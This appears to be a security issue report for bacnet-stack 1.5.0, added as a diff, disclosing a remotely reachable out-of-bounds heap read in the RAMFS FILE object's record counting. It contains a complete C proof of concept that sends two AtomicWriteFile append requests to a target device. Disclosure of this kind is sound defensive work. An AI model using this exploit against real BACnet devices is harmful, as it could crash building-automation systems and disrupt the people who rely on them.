@@ -1,0 +1,318 @@
+issue #1399
+
+Summary
+
+In bacnet-stack 1.5.0 (master branch commit 932e347), the RAMFS-backed FILE object implementation stores appended records as NUL-terminated strings, but its record-counting logic later walks the buffer as if an additional terminating empty record were present. As a result, two consecutive AtomicWriteFile(record-access) append requests can cause record_count() to call bacnet_strnlen() on a pointer that is already one byte past the end of the heap allocation.
+
+The issue is remotely reachable through the normal BACnet AtomicWriteFile service path. In an affected deployment, a client only needs to append two records to the same writable FILE object to trigger the out-of-bounds read, potentially causing a crash, denial of service, or other undefined behavior.
+
+Relevant logic:
+
+handler_atomic_write_file_encode() accepts FILE_RECORD_ACCESS requests as long as fileStartRecord >= -1.
+When fileStartRecord == -1, the request is treated as an append and is forwarded through:
+handler_atomic_write_file_encode()
+  -> bacfile_write_record_data()
+    -> bacfile_write_record_data_callback()
+      -> bacfile_ramfs_write_record_data()
+At the start of bacfile_ramfs_write_record_data(), the RAMFS backend counts existing records with:
+fileRecordCount = record_count(pFile->data);
+record_count() walks the record buffer like this:
+do {
+    len = bacnet_strnlen(records, MAX_OCTET_STRING_BYTES);
+    if (len > 0) {
+        count++;
+        records = records + len + 1;
+    }
+} while (len > 0);
+The append branch in bacfile_ramfs_write_record_data() grows the heap allocation by exactly fileDataStrLen + 1 and writes only:
+record bytes + '\0'
+This layout does not append an additional empty-record sentinel after the terminating NUL.
+If the file currently ends with exactly one NUL-terminated record, record_count() scans that record, advances records by len + 1, and may land exactly at the end of the allocation.
+record_count() then performs another bacnet_strnlen(records, MAX_OCTET_STRING_BYTES) on that already-out-of-bounds pointer.
+bacnet_strnlen() is implemented with memchr(str, 0, maxlen), so this becomes an out-of-bounds heap read immediately.
+
+
+PoC
+
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+/* BACnet Stack defines - first */
+#include "bacnet/bacdef.h"
+
+/* BACnet Stack API */
+#include "bacnet/apdu.h"
+#include "bacnet/awf.h"
+#include "bacnet/bactext.h"
+#include "bacnet/npdu.h"
+
+/* basic services / client helpers */
+#include "bacnet/basic/binding/address.h"
+#include "bacnet/basic/npdu/h_npdu.h"
+#include "bacnet/basic/service/h_apdu.h"
+#include "bacnet/basic/service/h_iam.h"
+#include "bacnet/basic/service/s_whois.h"
+#include "bacnet/basic/tsm/tsm.h"
+#include "bacnet/datalink/datalink.h"
+#include "bacnet/datalink/dlenv.h"
+
+static uint8_t Rx_Buf[MAX_MPDU] = { 0 };
+static uint32_t Target_Device_Instance = BACNET_MAX_INSTANCE;
+static uint32_t Target_File_Instance = 1;
+static BACNET_ADDRESS Target_Address;
+static uint8_t Request_Invoke_ID = 0;
+static bool AWF_Acked = false;
+static bool AWF_Failed = false;
+
+static void AckHandler(
+    uint8_t *service_request,
+    uint16_t service_len,
+    BACNET_ADDRESS *src,
+    BACNET_CONFIRMED_SERVICE_ACK_DATA *service_data)
+{
+    BACNET_ATOMIC_WRITE_FILE_DATA ack_data = { 0 };
+    int len = 0;
+
+    if (!address_match(&Target_Address, src) ||
+        (service_data->invoke_id != Request_Invoke_ID)) {
+        return;
+    }
+    len = awf_ack_decode_service_request(service_request, service_len, &ack_data);
+    if (len > 0) {
+        AWF_Acked = true;
+    } else {
+        AWF_Failed = true;
+    }
+}
+
+static void ErrorHandler(
+    BACNET_ADDRESS *src,
+    uint8_t invoke_id,
+    BACNET_ERROR_CLASS error_class,
+    BACNET_ERROR_CODE error_code)
+{
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        fprintf(stderr, "BACnet Error: %s / %s\n",
+            bactext_error_class_name(error_class),
+            bactext_error_code_name(error_code));
+        AWF_Failed = true;
+    }
+}
+
+static void AbortHandler(
+    BACNET_ADDRESS *src, uint8_t invoke_id, uint8_t abort_reason, bool server)
+{
+    (void)server;
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        fprintf(stderr, "BACnet Abort: %s\n",
+            bactext_abort_reason_name((int)abort_reason));
+        AWF_Failed = true;
+    }
+}
+
+static void RejectHandler(
+    BACNET_ADDRESS *src, uint8_t invoke_id, uint8_t reject_reason)
+{
+    if (address_match(&Target_Address, src) && (invoke_id == Request_Invoke_ID)) {
+        fprintf(stderr, "BACnet Reject: %s\n",
+            bactext_reject_reason_name((int)reject_reason));
+        AWF_Failed = true;
+    }
+}
+
+static void InitHandlers(void)
+{
+    apdu_set_unconfirmed_handler(SERVICE_UNCONFIRMED_I_AM, handler_i_am_bind);
+    apdu_set_confirmed_ack_handler(
+        SERVICE_CONFIRMED_ATOMIC_WRITE_FILE, AckHandler);
+    apdu_set_error_handler(
+        SERVICE_CONFIRMED_ATOMIC_WRITE_FILE, ErrorHandler);
+    apdu_set_abort_handler(AbortHandler);
+    apdu_set_reject_handler(RejectHandler);
+}
+
+static uint8_t SendRecordAppend(
+    uint32_t device_id, uint32_t file_instance, const uint8_t *record_data,
+    size_t record_len)
+{
+    BACNET_ADDRESS dest = { 0 };
+    BACNET_ADDRESS my_address = { 0 };
+    BACNET_NPDU_DATA npdu_data = { 0 };
+    BACNET_ATOMIC_WRITE_FILE_DATA data = { 0 };
+    unsigned max_apdu = 0;
+    uint8_t invoke_id = 0;
+    int pdu_len = 0;
+    int len = 0;
+    int bytes_sent = 0;
+
+    if (!address_get_by_device(device_id, &max_apdu, &dest)) {
+        return 0;
+    }
+    invoke_id = tsm_next_free_invokeID();
+    if (!invoke_id) {
+        return 0;
+    }
+
+    data.object_type = OBJECT_FILE;
+    data.object_instance = file_instance;
+    data.access = FILE_RECORD_ACCESS;
+    data.type.record.fileStartRecord = -1;
+    data.type.record.returnedRecordCount = 1;
+    if (!octetstring_init(&data.fileData[0], record_data, record_len)) {
+        tsm_free_invoke_id(invoke_id);
+        return 0;
+    }
+
+    datalink_get_my_address(&my_address);
+    npdu_encode_npdu_data(&npdu_data, true, MESSAGE_PRIORITY_NORMAL);
+    pdu_len = npdu_encode_pdu(
+        &Handler_Transmit_Buffer[0], &dest, &my_address, &npdu_data);
+
+    len = awf_encode_apdu(&Handler_Transmit_Buffer[pdu_len], invoke_id, &data);
+    pdu_len += len;
+    if ((unsigned)pdu_len > max_apdu) {
+        tsm_free_invoke_id(invoke_id);
+        return 0;
+    }
+
+    tsm_set_confirmed_unsegmented_transaction(
+        invoke_id, &dest, &npdu_data, &Handler_Transmit_Buffer[0],
+        (uint16_t)pdu_len);
+    bytes_sent =
+        datalink_send_pdu(&dest, &npdu_data, &Handler_Transmit_Buffer[0], pdu_len);
+    if (bytes_sent <= 0) {
+        tsm_free_invoke_id(invoke_id);
+        return 0;
+    }
+
+    return invoke_id;
+}
+
+static void Pump(time_t *last_seconds)
+{
+    BACNET_ADDRESS src = { 0 };
+    uint16_t pdu_len = 0;
+    time_t current_seconds = 0;
+
+    pdu_len = datalink_receive(&src, &Rx_Buf[0], MAX_MPDU, 100);
+    if (pdu_len) {
+        npdu_handler(&src, &Rx_Buf[0], pdu_len);
+    }
+    current_seconds = time(NULL);
+    if (current_seconds != *last_seconds) {
+        tsm_timer_milliseconds((uint16_t)((current_seconds - *last_seconds) * 1000));
+        datalink_maintenance_timer((uint16_t)(current_seconds - *last_seconds));
+        *last_seconds = current_seconds;
+    }
+}
+
+static bool WaitForAck(time_t *last_seconds, uint8_t invoke_id)
+{
+    time_t deadline = time(NULL) + 10;
+
+    for (;;) {
+        Pump(last_seconds);
+        if (AWF_Acked && tsm_invoke_id_free(invoke_id)) {
+            return true;
+        }
+        if (AWF_Failed) {
+            if (!tsm_invoke_id_free(invoke_id)) {
+                tsm_free_invoke_id(invoke_id);
+            }
+            return false;
+        }
+        if (tsm_invoke_id_failed(invoke_id)) {
+            tsm_free_invoke_id(invoke_id);
+            return false;
+        }
+        if (time(NULL) >= deadline) {
+            if (!tsm_invoke_id_free(invoke_id)) {
+                tsm_free_invoke_id(invoke_id);
+            }
+            return false;
+        }
+    }
+}
+
+int main(int argc, char *argv[])
+{
+    unsigned max_apdu = 0;
+    time_t last_seconds = 0;
+    time_t deadline = 0;
+    static const uint8_t first_record[] = "AAAA";
+    static const uint8_t second_record[] = "BBBB";
+
+    if (argc < 3) {
+        fprintf(stderr, "usage: %s <device-instance> <file-instance>\n", argv[0]);
+        fprintf(stderr, "example: %s 260001 1\n", argv[0]);
+        return 1;
+    }
+
+    Target_Device_Instance = strtoul(argv[1], NULL, 0);
+    Target_File_Instance = strtoul(argv[2], NULL, 0);
+
+    address_init();
+    InitHandlers();
+    dlenv_init();
+    atexit(datalink_cleanup);
+
+    last_seconds = time(NULL);
+    Send_WhoIs(Target_Device_Instance, Target_Device_Instance);
+    deadline = time(NULL) + 10;
+    while ((time(NULL) < deadline) &&
+           !address_bind_request(
+               Target_Device_Instance, &max_apdu, &Target_Address)) {
+        Pump(&last_seconds);
+    }
+    if (!address_bind_request(Target_Device_Instance, &max_apdu, &Target_Address)) {
+        fprintf(stderr, "[-] bind target failed\n");
+        return 1;
+    }
+    printf("[+] bound target device %lu file %lu\n",
+        (unsigned long)Target_Device_Instance,
+        (unsigned long)Target_File_Instance);
+
+    AWF_Acked = false;
+    AWF_Failed = false;
+    Request_Invoke_ID = SendRecordAppend(
+        Target_Device_Instance, Target_File_Instance, first_record,
+        sizeof(first_record) - 1);
+    if (!Request_Invoke_ID) {
+        fprintf(stderr, "[-] failed to send first AtomicWriteFile request\n");
+        return 1;
+    }
+    printf("[*] sent request #1: append record \"AAAA\"\n");
+    if (!WaitForAck(&last_seconds, Request_Invoke_ID)) {
+        fprintf(stderr, "[-] request #1 timed out or failed\n");
+        return 1;
+    }
+    printf("[+] request #1 acked\n");
+
+    AWF_Acked = false;
+    AWF_Failed = false;
+    Request_Invoke_ID = SendRecordAppend(
+        Target_Device_Instance, Target_File_Instance, second_record,
+        sizeof(second_record) - 1);
+    if (!Request_Invoke_ID) {
+        fprintf(stderr, "[-] failed to send second AtomicWriteFile request\n");
+        return 1;
+    }
+    printf("[*] sent request #2: append record \"BBBB\"\n");
+    if (!WaitForAck(&last_seconds, Request_Invoke_ID)) {
+        fprintf(stderr, "[-] request #2 timed out or failed\n");
+        return 1;
+    }
+    printf("[+] request #2 acked\n");
+
+    return 0;
+}
+
+The PoC targets OBJECT_FILE, instance 1, on the target server and performs the following two requests:
+
+AtomicWriteFile(OBJECT_FILE, 1, FILE_RECORD_ACCESS, fileStartRecord = -1, returnedRecordCount = 1, fileData[0] = "AAAA")
+AtomicWriteFile(OBJECT_FILE, 1, FILE_RECORD_ACCESS, fileStartRecord = -1, returnedRecordCount = 1, fileData[0] = "BBBB")
+The first request creates a 5-byte heap buffer containing AAAA\0. The second request reaches the same append path again, but now the pre-write record_count() traversal reads past the end of that 5-byte allocation before the second record is even appended.
+
